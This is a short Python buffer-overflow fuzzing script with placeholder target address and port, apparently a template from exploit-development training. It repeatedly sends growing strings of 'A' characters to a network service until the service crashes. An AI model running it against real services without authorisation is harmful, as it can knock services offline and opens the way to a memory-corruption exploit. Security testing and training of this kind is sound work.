import socket, time

IP = '<target_ip>'
PORT = <target_port>

prefix = ''
overflow = prefix + 'A' * 100

while True:
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((IP,PORT))
        s.recv(1024)
        s.send(bytes(overflow, 'latin-1'))
        s.recv(1024)
        print('bytes sent: '+str(len(overflow)-len(prefix)))
        s.close()
        overflow += 'A' * 100
    except:
        print('Completed Total Bytes Sent: '+str(len(overflow)-len(prefix)))
        exit()
    time.sleep(1)
